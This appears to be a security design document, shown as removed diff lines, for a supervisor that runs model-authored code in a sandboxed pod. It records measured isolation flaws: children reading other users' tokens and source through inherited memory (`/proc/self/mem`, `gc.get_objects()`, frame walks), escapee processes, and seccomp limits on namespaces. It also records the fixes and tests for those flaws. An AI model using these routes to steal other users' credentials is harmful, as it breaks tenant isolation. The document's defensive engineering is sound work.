-implementers would each pick something reasonable, so they are written down rather than left
-in the code:
-
-- **The socket binds before the startup work runs**, so `status: "starting"` is observable
-  rather than theoretical: a probe arriving during `prewarm()` gets the contract's `503` with
-  a health body instead of a connection refusal. Nothing can be executed while not ready —
-  `/execute` answers `503 NotReady` — so this widens what is *visible*, not what is allowed,
-  and a failed assertion still exits non-zero and crash-loops the pod.
-- **`Content-Type` is parsed as a media type and its parameters are ignored**, per the
-  Transport paragraph above; `scripts/test-supervisor.py` locks bare, charset-bearing and
-  oddly-cased forms so nobody replaces it with a string compare.
-- **A chunked request body is refused (`400`).** A body with no `Content-Length` cannot be
-  size-capped before it is read, which is the one thing the 1 MiB cap exists to do. The
-  contract assumes a length, and every client of it is a JSON POST that has one.
-- **The duplicate-`execution_id` check is made twice, not once.** The contract phrases the
-  rule as "`/scratch/<execution-id>` already exists", but the directory is created at
-  dequeue, so two identical ids sitting in the queue would both pass a filesystem test. The
-  supervisor therefore refuses at **accept** against the union of queued, running and
-  retained ids *and* the filesystem, and again at **dequeue** by creating the directory with
-  `mkdir` and treating `EEXIST` as the same `409`. That is a superset of the stated rule and
-  preserves the same invariant.
-- **The execution ends when the child is reaped, not when its pipes close.** The write ends
-  of the output and status pipes are inherited by every descendant, so a grandchild that
-  `setsid()`s away holds them open after the direct child exits and EOF never comes. Reading
-  to EOF therefore held the execution slot on a *pipe read* rather than on a process:
-  measured, `/health` reported `busy: true, queued: 0` with nothing running, the response
-  never arrived, and a second user waited 36 s behind a child that had lived ~10 ms. The
-  drain now gets a deadline — `DRAIN_GRACE_S` (2 s) after `waitpid` returns — and the
-  supervisor closes the read ends itself and logs the abandonment; `duration_ms` is taken at
-  the reap, so it measures the child and not the drain. This is **not** something the
-  `4h6.41` wall clock fixes, and `4h6.41` landing has not changed that: an escapee has left
-  the process group, so `killpg` returns `ESRCH` and there is nothing group-shaped left to
-  kill. What kills such a process is the fork server's end-of-execution sweep
-  (`genetics-results-suite-4h6.83`), which runs **before** the drain threads are joined and so
-  usually delivers the pipe's EOF as a side effect — but the deadline stays, because the sweep
-  can fail (a dead fork server, or a kernel where `PR_SET_CHILD_SUBREAPER` does not take) and
-  because what this guarantees on its own is only that an escapee cannot block the queue. An
-  `abandoned` warning in the log is now evidence that a control failed rather than the expected
-  outcome it used to be.
-- **The drain deadline is evaluated whether or not bytes are still arriving**
-  (`genetics-results-suite-4h6.62`). It used to be checked only inside the branch `select` takes
-  when the fd goes quiet, which made it no deadline at all against the writer it was built for:
-  a descendant that `setsid()`s away and writes **continuously** keeps the fd ready on every
-  pass, so `time.monotonic() >= deadline` was never reached and one drain thread — plus the CPU
-  to keep reading and discarding — was held for the pod's lifetime, on a `replicas: 1` pod that
-  serves every later user. **Reachability, stated exactly:** since the end-of-execution sweep
-  moved *before* the drain joins, such a writer is normally already dead, so this needs the
-  sweep to miss — a dead fork server, a `PR_SET_CHILD_SUBREAPER` that did not take, a chain
-  deeper than `FS_SWEEP_MAX_ROUNDS`, or an unreadable `/proc` — which is the same residual set
-  the PID 1 reaper below exists for. **What the fix bounds, and what it does not.** It bounds
-  the **thread and the CPU**, and nothing else about the escapee: the process keeps running, and
-  a reaper does not touch it, because a live continuous writer is not a zombie. The **read end**
-  is closed by the same post-join cleanup every other abandoned drain goes through, so a
-  still-live writer takes `EPIPE`/`SIGPIPE` on its next write rather than the supervisor leaking
-  the descriptor — a consequence of the existing cleanup, not something this change added. **The
-  descriptor leak that remains** is the backstop branch: if a drain thread somehow outlives its
-  own deadline it is logged at ERROR (`… did not stop; leaking its read end`) and its read end
-  is deliberately **not** closed, because closing an fd another thread is blocked on is
-  undefined. That is a leak, it is bounded by nothing but a pod restart, and it is documented
-  rather than fixed.
-- **`aud` may be a single-element list.** Some minters emit `aud` that way; a one-element
-  list carrying the right value is the same claim. Anything else is a `400`.
-- **The child's working directory is `/scratch/<id>/tmp`.** `WORKDIR` is `/genetics` on a
-  read-only root, so a script writing a relative path would fail there; pointing it at the
-  artifacts directory instead would silently promote every scratch file the script writes
-  into the manifest.
-- **`SANDBOX_USER`, `SANDBOX_SESSION_ID` and `SANDBOX_EXECUTION_ID` are set in the child**
-  from the tokens' `sub`/`sid`/`jti`, and **they are not what attributes a collected record.**
-  The child owns its environment and can rewrite all three between two SDK calls, so `4h6.45`
-  discards the prefix the SDK renders from them and re-stamps from the claims on the read end.
-  They are still set: the SDK renders the line, the shipped stubs document them, and an
-  in-process (non-sandbox) host has no supervisor to stamp anything. **The environment prefix
-  and the signed claims are not the same evidence**, and only the second one survives to a
-  collector.
-- **The startup wipe removes everything under `/scratch` except the supervisor's own
-  directory.** After a restart the supervisor holds no record of what was live or retained —
-  that state is in memory and does not survive the process — so nothing under `/scratch`
-  belongs to a live or still-retained execution by the definition the rule uses. Wiping is
-  the conservative reading and the one the rule exists for: a crash mid-execution must not
-  leave a readable directory behind.
-- **The supervisor keeps one writable `MPLCONFIGDIR` of its own** at
-  `/scratch/.supervisor/mplconfig`, seeded from `$GENETICS_MPLCACHE`, purely so `prewarm()`
-  can import `matplotlib.pyplot` at startup. It is not shared with any child — every
-  execution still gets its own, seeded the same way — and the startup wipe keeps it by name.
-
-**No setuid, no chown, and none is attempted.** Option (b) is the shipped model: supervisor
-and child share uid 65532. Per-execution directories are `0700` and the child sets
-`umask(0o077)`; under one uid those modes keep everything else out and do nothing between
-the two processes, which is why the token file's protection has to be lifetime (`4h6.43`)
-and the pid budget has to be a supervisor-side watch (`4h6.41`).
-
-**What differs when the supervisor runs outside the image.** Every one of these is keyed on
-an environment variable `sandbox/Dockerfile` always sets, so "unset" means "not the image"
-and produces a loud warning rather than a silent behaviour change:
-
-- **`GENETICS_PREWARM` unset → `prewarm()` is skipped**, with a warning. In the image it is
-  always set, so `PrewarmError` crashes the pod exactly as the handoff table requires; on a
-  developer machine without numpy/scipy/polars/matplotlib installed the supervisor would
-  otherwise be unstartable.
-- **`GENETICS_MPLCACHE` unset → `MPLCONFIGDIR` starts empty** and matplotlib rebuilds its
-  font cache per execution (seconds), instead of the copy being free.
-- **`SANDBOX_SCRATCH_ROOT` set → the `/scratch` root moves.** Test-only, and warned about.
-  The hardcoded `/scratch/` prefix this bullet used to cite was the **local** reader's
-  (`4h6.15`); that reader is gone, and the supervisor resolves artifacts against whatever root
-  it was started with, so an overridden root now serves reads normally rather than making them
-  unretrievable. It stays test-only for the reason it always was: the root is the isolation
-  boundary the pod spec, the quotas and the startup sweep are all written against. The image
-  never sets it.
-- The `/etc/nsswitch.conf` assertion is **not** relaxed anywhere. It passes on an ordinary
-  Linux developer machine and failing it is the intended outcome elsewhere.
-
-#### The drain waits for the answer, not just for the slot (`4h6.57`, `4h6.63`)
-
-`terminationGracePeriodSeconds: 130` buys the supervisor three steps on `SIGTERM`: drain, reap,
-**answer**. The third one used to be skippable. (It buys no *wipe*: `wipe_unrecognised_scratch`
-has exactly one call site, in `bring_up()` — it is a **startup** sweep, and `/scratch` is an
-`emptyDir` destroyed with the pod. What a `SIGKILL` at the end of the grace actually costs is
-the in-flight **answer** and the clean `forkserver.close()` and child reap.) `_terminate` starts
-`_shutdown_when_idle`, which polled `Supervisor.idle()` — and `idle()` goes true in `run()`'s
-`finally`, where the
-execution slot is released, which runs **before** the handler writes the `200`. A `SIGTERM`
-landing in that window let `httpd.shutdown()` return, `main()` fall through `server_close()` and
-`forkserver.close()`, and the process exit with the response truncated or unsent. Nothing else
-covered it: `_Server` sets `daemon_threads = True`, and `socketserver._Threads.append` returns
-early for a daemon thread, so `ThreadingMixIn.server_close()` joins an empty list — **no part of
-the shutdown path waits for a handler thread**. The client sees a reset for an execution that
-**completed** and whose artifacts are retained, and `sandbox_client` classifies a reset as
-`SandboxUnavailable` with `retryable: true` — so the model is told to re-run a script whose side
-effects have already happened.
-
-The fix is an explicit count of responses still owed, not a wider `idle()` and not a sleep.
-`POST /execute`'s handler takes the count before any work and gives it back in a `finally` that
-covers **every** exit — the deliberate returns, the fall-through after the `200`, and anything
-that escapes, which includes `_send_json` itself: it calls `send_response()`/`end_headers()`
-outside its own `except OSError`, so a client resetting mid-execution raises
-`ConnectionResetError` straight out of the handler body. The exits are not counted here on
-purpose — a `finally` covers any number of them, so a number would buy nothing and rot. The
-shutdown path polls a new predicate, `Supervisor.quiescent()` (`idle()` **and** nothing owed).
-`idle()` is unchanged, because
-`_await_slot`, `_release` and `health()` all read it as a statement about the execution slot.
-
-**What is counted, and why the rest is safe uncounted.** Only `POST /execute` is counted.
-`/health` and `/artifact` are not, and that is a property of those routes rather than an
-oversight: both are idempotent `GET`s with no side effect, so a reset on one cannot cause the
-duplicate-execution harm this whole mechanism exists to prevent, and artifacts live in the
-pod's `emptyDir` and are lost to termination either way — a retry against the replacement pod
-gets a terminal `404`, not a wrong answer. The consequence that matters operationally is that a
-kubelet readiness probe can never hold the drain open.
-
-**And the wait is bounded — `DRAIN_DEADLINE_S = 125.0`.** The gate waits on something that has
-no deadline of its own: `_send_json`'s write is socketserver's `_SocketWriter` doing a blocking
-`sendall` on a connection deliberately left at `settimeout(None)` by `_read_head`/`_read_body`,
-so a peer that stops ACKing parks the handler for `tcp_retries2` (~15 minutes) and a peer that
-never reads can park it for as long as it likes — measured at 115s and still climbing with
-20 000 pipelined `400`s on one unread socket, against 0.0s for the pre-`4h6.57` gate. An unbounded
-gate therefore converts *one truncated response* into *a process that never exits*, `SIGKILL`ed
-at the end of the grace, losing the clean `forkserver.close()` and child reap on top of the
-answer that was lost anyway. At `DRAIN_DEADLINE_S` the gate proceeds regardless of the count and
-logs at `ERROR` with the number of responses it abandoned. The arithmetic: an execution already
-running when the `SIGTERM` landed can need `MAX_TIMEOUT_S` (120) plus `KILL_GRACE_S` (2) to reach
-its deadline and be reaped, so 125 sits **above** 122 and never cuts the normal path short, and
-**below** the manifest's 130 by 5s — room for `httpd.shutdown()`, `server_close()` and
-`forkserver.close()`, which all run after the gate returns. The worst case degrades back to
-exactly what it was before this change: a truncated response.
-
-**Two routes to the same hang, closed by two different things.** A count that leaked on one exit
-path would make the drain never reach zero; that route is closed by the `finally`. A count that
-is perfectly balanced but whose exit never *happens* — the parked `sendall` — reaches the
-identical outcome **with no leak at all**; that route is closed only by the ceiling. Neither
-substitutes for the other. `begin_drain()` having already run does *not* keep the wait short by
-itself: it makes `/execute` answer `503` before reading a body, but a `503` is still a counted
-response that has to be written, and it is written down the same unbounded socket.
-
-`4h6.63` is the same ownership question one step earlier. `_execute_inner` created its three
-pipe pairs *above* the `try` whose `except BaseException` closes every descriptor an execution
-holds, so an `EMFILE` from the second or third `os.pipe()` — and fd exhaustion is the only state
-in which `os.pipe()` fails at all — leaked the two or four already made, permanently, in the one
-state where the process can least afford them. The pipes are now created inside that `try`, with
-all seven descriptor names bound to `None` first so the handler can run before any of them
-exists. (The bead that recorded this also asserted the surrounding sequence needed restructuring
-around `_relocate_above`; that stopped being true when `4h6.55` moved the fork into the fork
-server — `_relocate_above` now runs in a different process.)
-
-`scripts/test-supervisor.py` covers all of it with negative controls that restore the defect
-rather than flag it:
-
-- `SUPERVISOR_TEST_SHUTDOWN_ON_IDLE=1` reinstates the `idle()`-only gate. The shutdown check is
-  constructed, not raced — `_release` is wrapped so the drain and the shutdown thread start at
-  the instant the slot is freed — and the property asserted is an ordering: what the shutdown
-  gate had seen when it returned.
-- `SUPERVISOR_TEST_COUNT_NO_FINALLY=1` moves `end_response()` out of the `finally`. It exists
-  because it was measured that this control leaves the error-exit checks entirely green — every
-  one of those exits *returns normally* and so needs no `finally` — which means the only check
-  that can hold the `finally` honest is one that drives an exception **out of** the counted
-  region. That is `test_shutdown_count_escapes`, and it is the check the control turns red.
-- `SUPERVISOR_TEST_SHUTDOWN_NO_CEILING=1` reinstates the unbounded gate, turning
-  `test_shutdown_ceiling` red. The ceiling is exercised against an overridden deadline
-  (`_shutdown_when_idle`'s `deadline_s` argument), not by waiting out 125 real seconds.
-- `SUPERVISOR_TEST_PIPES_OUTSIDE_TRY=1` reinstates a pipe pair created outside the `try`
-  (`4h6.63`).
-
-### As built (`4h6.40`) — the local Docker backend, and the six things it does not reproduce
-
-`scripts/run-sandbox-local.sh` builds `sandbox/` and runs **the same image, the same
-entrypoint and the same supervisor** in a plain container:
-
-```
-./scripts/run-sandbox-local.sh                 # build, (re)start, wait for /health
-./scripts/run-sandbox-local.sh --test          # ... and drive the contract against it
-./scripts/run-sandbox-local.sh --no-build      # restart in seconds
-./scripts/run-sandbox-local.sh --logs          # container stdout = the audit sink
-./scripts/run-sandbox-local.sh --stop
-```
-
-**There is no local code path.** The supervisor is passed as the container's command at
-`docker run` time, which is exactly what the manifest now does with
-`args: ["/genetics/supervisor.py"]` (`4h6.50`, landed); the image still ships no `CMD`, so the
-local runner and the pod share one argv rather than one of them relying on a baked default.
-Nothing here can reach a cluster because this is a `docker run` on a laptop, not because
-`scripts/deploy.sh` refuses the manifest — that refusal is now *satisfied* by the `args:` key,
-and it checks the container named `sandbox` in the Deployment named `sandbox` rather than
-anything about this script. chat-backend's client holds one base URL and does the same thing
-against both.
-
-| local flag | the manifest line it stands in for |
-|---|---|
-| `--user 65532:65532`, `--cap-drop ALL`, `--security-opt no-new-privileges` | `runAsUser`/`runAsGroup` 65532, `capabilities.drop: [ALL]`, `allowPrivilegeEscalation: false` |
-| `--read-only` | `readOnlyRootFilesystem: true` |
-| `--tmpfs /scratch:…,mode=0700,uid=65532,gid=65532` | the one `emptyDir` at `/scratch`, `fsGroup: 65532` |
-| `--memory 3g --cpus 1.5` | `limits.memory` / `limits.cpu` |
-| `--pids-limit 1024` | the kubelet's `pod_pids_limit` |
-| `--stop-timeout 130` | `terminationGracePeriodSeconds: 130`. `--stop` uses `docker stop`, so the drain-reap-answer sequence the 130s buys actually runs locally; `docker rm -f`/`docker kill` bypasses it |
-| `--publish 127.0.0.1:8081:8080` | container port 8080 and the Service; the host port differs **only** because the local db-api already holds 8080 |
-| `GENETICS_API_URL` / `BIGQUERY_API_URL` at `host.docker.internal`, on the **dev-stack's** ports (results-api `:2000`, db-api `:8080`) and not the manifest's — locally `:4000` is chat-api (`4h6.49`) | the same two variables at cluster FQDNs pinned by `hostAliases` |
-| `SANDBOX_RETENTION_S` passed through when set, so the retention deadline is observable in a test run (`4h6.49`) | unset; the supervisor's 300s |
-| the supervisor as the `docker run` command | `args:` (`4h6.50`) |
-
-**What is not reproduced.** The script prints this list every time it brings the container
-up, because a fidelity gap nobody reads is the same as no fidelity gap at all:
-
-1. **gVisor.** `runc`, not `runsc`, unless the daemon has the runtime registered — the script
-   auto-detects it and says which one it used. Without it the host kernel is directly
-   reachable from model-authored code, so section 2's "userspace syscall boundary" is the one
-   control whose absence changes the threat model rather than the test coverage.
-2. **The NetworkPolicy.** There is none. Egress is **unrestricted** — the whole host network,
-   the internet, and `169.254.169.254`. Every claim in section 3 is untested locally; a
-   script that exfiltrates in this container proves nothing about the pod, in either
-   direction.
-3. **`pod_pids_limit`.** `--pids-limit 1024` is a per-**container** cgroup where the kubelet's
-   is per-**pod**. Close enough to exercise `4h6.41`'s budget, not the same backstop.
-4. **The seccomp profile.** Docker's default, not `RuntimeDefault` via containerd. They are
-   near-identical in origin and this is the one difference that turned out to be
-   load-bearing — see the measurement below.
-5. **`sizeLimit` enforcement — and, more consequentially, which budget `/scratch` is charged
-   to.** The local `/scratch` is a 512 MiB tmpfs, so over-budget writes get `ENOSPC`. Under an
-   `emptyDir` `sizeLimit` the **kubelet evicts the pod** instead — which is precisely the
-   failure `4h6.46`'s sub-quotas exist to prevent, and it **cannot happen locally**. A quota
-   implementation that only ever sees `ENOSPC` is untested against the thing it was written
-   for.
-
-   The second half of this gap is easier to miss and it changes how `4h6.41` must size its
-   limits. **A tmpfs is page cache in the container's own memory cgroup**: locally, every byte
-   under `/scratch` is charged against the *same* `--memory 3g` as the child's RSS. Measured
-   inside the running container: `memory.current` **113 MiB → 414 MiB** after writing 300 MiB
-   to `/scratch`. In the pod, `volumes.scratch.emptyDir` carries **no `medium: Memory`**, so it
-   is node-disk-backed and charged to a **different, separately limited budget** —
-   `ephemeral-storage` (requests `1Gi` / limits `2Gi`) — and **never** to `limits.memory: 3Gi`.
-   So a script holding 2.6 GiB RSS beside a 400 MiB `/scratch` is cgroup-OOM-killed locally and
-   runs fine in the pod, and an `RLIMIT_AS` or supervisor headroom tuned against this container
-   is up to 512 MiB more conservative than the pod needs. `4h6.46`'s `/scratch` polling never
-   sees the memory interaction locally at all, because in the pod there isn't one.
-6. **`ephemeral-storage` requests/limits (`1Gi`/`2Gi`).** **No local form exists at all.**
-   Docker has no equivalent knob, so the budget that actually bounds `/scratch` in the pod is
-   not merely approximated here — it is absent, and exceeding it (kubelet eviction) is
-   unobservable locally in either direction.
-7. **`restartPolicy`.** `--restart no` against a Deployment that restarts: a crash-loop bug
-   presents locally as a dead container with its logs intact and in the cluster as
-   `CrashLoopBackOff`. Deliberate, and better for development, but it is a behavioural
-   difference and belongs on this list.
-8. **DNS and `hostAliases`.** The container uses ordinary Docker DNS; the pod has
-   `dnsPolicy: None` and resolves the two service names out of `/etc/hosts`. The startup
-   `/etc/nsswitch.conf` assertion still runs and still passes, so the `files`-before-`dns`
-   requirement is exercised; the *absence* of a resolver is not.
-
-`terminationGracePeriodSeconds: 130` **is** reproduced, via `--stop-timeout 130` plus a `--stop`
-that calls `docker stop` rather than `docker rm -f` — see the table above. It is named here only
-because getting it wrong is silent: `docker kill`, `docker rm -f` or Ctrl-C on the daemon all
-SIGKILL immediately and skip the drain-reap-answer sequence the 130s exists for.
-
-Also not reproduced, and worth naming because it is a difference in **behaviour** rather than
-configuration: the audit stream goes to the container's stdout, collected by `docker logs`
-rather than by the cluster's logging agent. That is the single place the deployment
-difference shows in what the supervisor does, and it was already anticipated above.
-
-**`scripts/test-supervisor.py --container URL [--container-name NAME]`** drives the contract
-against the running container over HTTP and adds a group of checks that only exist there,
-because they are
-properties of the **image**: the read-only root filesystem, the absence of a writable `/tmp`,
-the pruned venv (no `pip`, no `setuptools`, no `google-auth`), the genetics SDK importing,
-matplotlib producing a PNG from the baked font cache under a read-only rootfs, no credential
-anywhere in the child's environment, and the child running as 65532 rather than the
-advertised-and-unreachable 65533. `--container-name NAME` additionally lets the audit-stream
-group read the container's own stdout via `docker logs`, which is the only place those records
-appear; without it that group skips by name. In-process mode is unchanged and remains the fast
-path. Both modes also compare the harness's **copy** of `analyze_conversations.py`'s
-`SDK_CALL_RE` against the literal in a `genetics-mcp-server` checkout beside this one, read off
-disk with `ast` rather than imported (the sandbox image installs only the SDK's import closure,
-so the two repos cannot share a module). Watching only the supervisor side would let the
-*analyzer* move while every assertion built on the stale copy kept passing; with no sibling
-checkout the comparison skips by name rather than passing quietly.
-
-**The two counts are not comparable, and the summary line says so.** Container mode runs the
-two wire groups plus the image group — nothing else. The groups that reach into the
-supervisor's own objects (the startup assertions, request parsing, the queue, the artifact
-manifest, the startup wipe) are **not run at all** over HTTP, because no route reaches them;
-that is most of the in-process checks. They are printed by name under "check groups NOT RUN in
-this mode" at the end of every container run, so a container total cannot be read as a
-near-complete fraction of the in-process total. `skip()` is the narrower mechanism and its
-claim is unchanged: it covers a check *inside a group that ran* — one needing the harness's
-own view of `/scratch`, which a container does not give it — and those are counted and listed
-individually. One such skip has since become a real check in both modes: the retained
-artifacts of a refused-duplicate execution are now read back over `GET /artifact`
-(`genetics-results-suite-8z1`) instead of by looking at the host filesystem, so container mode
-verifies it too. Implementing the missing groups over the wire is
-not this bead's scope; being honest about their absence is.
-
-**One thing only became visible in a container.** In-process, the harness and the supervisor
-share an interpreter, a uid and a filesystem, so `SANDBOX_SCRATCH_ROOT` is set and `/scratch`
-is a temporary directory — the exact configuration `_scratch_root()` warns is test-only.
-Container mode is the first run in which `/scratch` is `/scratch`, the rootfs is read-only
-and `prewarm()` actually executes, and it confirmed the ordering `prewarm.py`'s docstring
-demands: a plot is produced with no writable path outside `/scratch` and no font-cache
-rebuild. Nothing in the wire contract needed changing — the supervisor answered identically
-in both modes on every shared check.
-
-#### Measurement for `4h6.55`: the namespace blocker is the seccomp profile, not the capabilities
-
-`4h6.55` (fork-without-exec plus one shared uid leaves no isolation between executions) has a
-leading candidate fix that needs a PID namespace and a mount namespace under `drop: [ALL]`,
-`allowPrivilegeEscalation: false`, uid 65532. Measured from **inside a real execution** in
-this container — i.e. from the position an attacker occupies — with the image, the shared
-uid and `CapEff: 0000000000000000`, `NoNewPrivs: 1`, `Seccomp: 2`:
-
-| call | result |
-|---|---|
-| `unshare(CLONE_NEWNS)` | `EPERM` |
-| `unshare(CLONE_NEWPID)` | `EPERM` |
-| `unshare(CLONE_NEWUSER)` | `EPERM` |
-| `unshare(CLONE_NEWUSER\|CLONE_NEWNS\|CLONE_NEWPID)` | `EPERM` |
-
-The control experiment is what makes this useful. With **the same** uid, `--cap-drop ALL` and
-`no-new-privileges`, and **only** `seccomp=unconfined` changed: `unshare(CLONE_NEWUSER)`
-**succeeds**, and inside that user namespace `unshare(CLONE_NEWNS|CLONE_NEWPID)` **also
-succeeds**. So the blocker on the namespace calls is the **seccomp profile**, not the
-capability set and not `no_new_privs` — the profile returns `EPERM`, which is
-indistinguishable from the capability check unless you vary it.
-
-**But only the `CLONE_NEWUSER`-first route works, even unconfined.** With the profile relaxed,
-`unshare(CLONE_NEWNS)` and `unshare(CLONE_NEWPID)` *alone* still return `EPERM`: they need
-`CAP_SYS_ADMIN` in the current user namespace, which this uid does not have and the relaxed
-profile does not confer. Only entering a new **user** namespace first — where the process is
-root and therefore holds `CAP_SYS_ADMIN` in it — makes the mount and pid namespaces reachable.
-This constrains how `4h6.55`'s fix must be *written*, not just what it must be granted: a fix
-that calls `unshare(CLONE_NEWPID)` directly fails even with the profile relaxed, so the call
-has to be `CLONE_NEWUSER` first (or `CLONE_NEWUSER|…` in one call) and the uid/gid maps
-written before anything else is attempted.
-
-**`setuid(65533)` is a separate result and does not belong to the finding above.** It returns
-`EPERM` under the default profile *and* under `seccomp=unconfined` — the control leaves it
-unchanged. Its blocker is the **capability set** (no `CAP_SETUID` under `drop: [ALL]`), which
-is why option (a) is unreachable exactly as recorded, and relaxing seccomp would not recover
-it. The same holds for `chown(65533)` and `CAP_CHOWN`.
-
-Consequences for `4h6.55`, none of them acted on here:
-
-- A namespace-based fix under `RuntimeDefault` needs the profile relaxed, and "custom seccomp
-  profile" is already in **Rejected controls** above (it needs a node-local file distributed
-  by DaemonSet and referenced via `localhostProfile`). That rejection now costs something
-  concrete, so it is owed a re-examination rather than a re-citation.
-- **This says nothing about gVisor**, and gVisor is what will actually run. `runsc` implements
-  `unshare` in the sentry with its own support matrix, and the profile enforced at the host
-  applies to the sentry's syscalls, not the application's. Unmeasured, and not measurable on
-  this machine, which has no `runsc`.
-- Docker's default profile is the closest local analogue of `RuntimeDefault`, not the same
-  file. The measurement is a strong hint about the cluster, not a result from it.
-
-### As built (`4h6.55`) — the fork server: the process that forks has never seen a token
-
-**USER RULING: option (b).** Of the three candidates `4h6.55` put up — (a) exec after fork,
-(b) a fork server started before any request is parsed, (c) namespaces — the user chose (b),
-because it needs no seccomp profile change and no live-cluster measurement, and it keeps the
-prewarmed interpreter that (a) throws away. (c) remains the only mechanism found that would
-kill the escaped-process class, at the price the seccomp measurement above describes; it is
-neither adopted nor rejected here.
-
-#### What was actually broken
-
-`4h6.55` demonstrated, against the real supervisor forking real children, that a child could
-read **other users' tokens, source code and session ids** out of the address space it
-inherited. Four routes, all measured: a module global holding the queued victim's request; a
-frame walk reaching `job.req.tokens` and the raw request body bytes; `gc.get_objects()`
-filtered on the request type; and a scan of `/proc/self/mem`, which recovered tokens from a
-**queued** execution, a **running** one, and one **already completed and released**.
-
-The fourth route is why nothing reference-shaped could fix it. Python strings are immutable
-and freed objects stay in arenas that copy-on-write hands to the child, so `del`, `__slots__`,
-clearing references and overwriting all fail — a string explicitly dropped and
-`gc.collect()`-ed before the fork was still recoverable in the child. **The only thing that
-closes it is never letting the bytes into the process that forks.**
-
-#### What is built
-
-A **fork server**, forked out of the supervisor in `bring_up()` — *after* `prewarm()`, so it
-inherits the pre-imported analysis modules, and *before* `ready`, so it is forked from a
-supervisor that has never read a request. Every execution child is forked from that process.
-
-Per execution the supervisor sends it **one control message, `{"op": "fork"}`, and four
-descriptors** over a `SOCK_SEQPACKET` socketpair. It reads none of them. It does not learn the
-execution id, the user, the session, the code, or the directory paths — those travel in a JSON
-blob on an **anonymous descriptor** (`memfd_create`, falling back to a create-then-unlink file
-in the execution's own directory) which is passed *through* the fork server to the child, and
-which only the child reads. The fork server's whole vocabulary is three ops (`fork`, `wait`,
-`reap`) with the key set `{op, pid, nohang}`; `scripts/test-supervisor.py` asserts that key set
-against the source, because "just add the execution id to the fork message" is the change that
-silently re-opens all of this.
-
-The bar this has to meet is one sentence: **the process that calls `os.fork()` to create an
-execution child must never, at any point in its lifetime, for any execution, have held a token,
-a request body, or another user's source code.**
-
-That bar is met by an **enforced ordering, not by an unconditional "never"**, and the
-difference is a real defect that was measured. `main()` binds and starts `serve_forever`
-*before* `bring_up()`, deliberately, so that a probe arriving during the multi-second
-`prewarm()` gets `status: "starting"` rather than a connection refusal — which means requests
-**do** arrive while the fork server has not been forked yet. The readiness check originally sat
-in `Supervisor._admit`, *after* `_read_body` and `parse_execute_request` had already
-materialised both JWTs and the user's source as Python strings; the request was then refused
-with 503, but the bytes were in the arenas that `ForkServer.start()` snapshots seconds later. A
-later execution child recovered an early request's token, source and session id by the
-`/proc/self/mem` route, while a needle minted *after* `bring_up()` was not found — so the
-search was specific and those were real inherited bytes. Reachability is not theoretical
-either: an in-place container restart keeps the pod in the Service endpoints for
-`failureThreshold × periodSeconds` (~30 s) while the new supervisor is already accepting
-connections, and anything the NetworkPolicy admits can reach the pod IP directly.
-
-The fix is the ordering, in `_Handler._execute`: **not-ready and draining are refused (503
-`NotReady`, connection closed) before a byte of the body is read**, via `Supervisor.accepting()`.
-`_admit` still re-checks under the queue lock, where the admission decision is actually made.
-
-**The ordering alone did not meet the bar as stated, and the gap was measured.** `_Handler`
-used to inherit `rbufsize = -1`, so `BaseHTTPRequestHandler`'s request-line/header parse
-performed an 8 KiB **buffered** `recv` before `_execute` was entered at all. A body that shares
-that TCP segment with its headers — any body under ~8 KiB from a normal client, and
-`http.client` concatenates them — was already raw in the supervisor's heap when the readiness
-check ran. The A/B that isolates it: **headers+body in one segment → early code, header, session
-id and token all recovered** from a child forked promptly after the refusal; **headers and body
-in separate segments → nothing recovered**. Under a realistic startup window (prewarm ~3.06 s,
-request at +10 ms) nothing was recovered either — but that is arena reuse, not exclusion, and
-nothing enforces it. Reachability is unchanged from above: an in-place container restart keeps
-the pod in the Service endpoints for `failureThreshold × periodSeconds` (~30 s) while the new
-supervisor is already accepting.
-
-**What closes it (`4h6.87`): `_HeaderBoundedReader`.** `_Handler.rbufsize` is now `0` and
-`setup()` replaces `rfile` with a reader that finds the end of the request head by **peeking**
-the socket (`MSG_PEEK` leaves the receive queue intact) and then consumes **exactly** the head.
-The body stays in the *kernel* receive queue until `_read_body` asks for it, so a request
-refused by the readiness gate leaves nothing in this address space to snapshot. The same probe
-that recovered the token, source and session id from a one-segment request now recovers only
-the positive control; `test_pre_ready_body_bytes` in `scripts/test-supervisor.py` is that probe,
-with the fork gated to land milliseconds after the 503 and with the pre-fix `rfile` restorable
-via `SUPERVISOR_TEST_BUFFERED_RFILE=1` as its negative control.
-
-**The enforced property, and its bound — this is not "zero bytes", and the difference is
-deliberate:**
-
-* **No byte of a request BODY is in the supervisor's heap when the readiness gate refuses** —
-  the head read's `finally` wipes its buffers before `rfile` returns a line, and the gate runs
-  after that. That is what the probe measures and what the test asserts.
-* The peek copies at most `HEADER_PEEK_BYTES` (512) at a time into **one fixed `bytearray`**,
-  and the seam search for a terminator split across two peeks runs in a **second fixed 6-byte
-  `bytearray`** (`2 × (len("\r\n\r\n") - 1)`). Both are zeroed **in place** in the same
-  `finally` before the head read returns, and reused rather than reallocated — so nothing is
-  left in a freed arena. Up to 511 body bytes are in the first *transiently*, and up to 2 more
-  in the second when a head ends 1 or 2 bytes into a new peek round; only a fork landing inside
-  that window — between the peek and the wipe in the same call — could see them. That is a
-  microsecond window inside one function, against the previous "for the whole life of the
-  request, and afterwards in the arena". Neither buffer may be replaced by a `bytes`: an
-  earlier draft built the seam window as `tail + bytes(view[:n])` and that copy — measured
-  `b'\r\n\r\nNE'`, two body bytes — was freed into an arena, the exact route this design
-  exists to close.
-* **That window ROLLS across peek rounds; it is not recomputed from the current one.** A draft
-  set it to the last `min(take, 3)` bytes of the round just consumed, which is correct only
-  while every peek returns at least 3 bytes. A peer dripping the head **one byte at a time** —
-  which any peer that can open a TCP connection may do — shrank the window to that one byte, so
-  an ordinary, entirely valid `\r\n\r\n` blank line straddling it was never found, and the
-  failure was the previous bullet's, reached through peek size instead of terminator shape:
-  `take` became the whole peek every round, the **whole body** was consumed off the kernel queue
-  onto the heap, the `finally` never ran, and the request blocked in `recv_into` forever instead
-  of being refused. `total` never approaches `MAX_HEADER_BYTES` there, so `_HeaderTooLarge` does
-  not fire either — fail-**open**, pre-auth, and permanent, since at the time the connection
-  carried no timeout outside `_read_body` and `_Server`'s handler threads are daemons. (`4h6.58`
-  has since put a deadline on the head read, so the same defect would now end in a `408` after
-  `HEAD_READ_TIMEOUT_S` rather than never; the rolling window is still what makes it not happen.) MEASURED over the
-  4 blank-line shapes × 7 chunk sizes: 28/28 with the rolling window, 26/28 without, failing
-  exactly the 1-byte cells whose blank line is `\r\n` (2-byte peeks are rescued by the `\n\r\n`
-  member, and `\n\n` fits a 2-byte window). `SUPERVISOR_TEST_STATIC_SEAM=1` restores the
-  per-round window and turns those checks red.
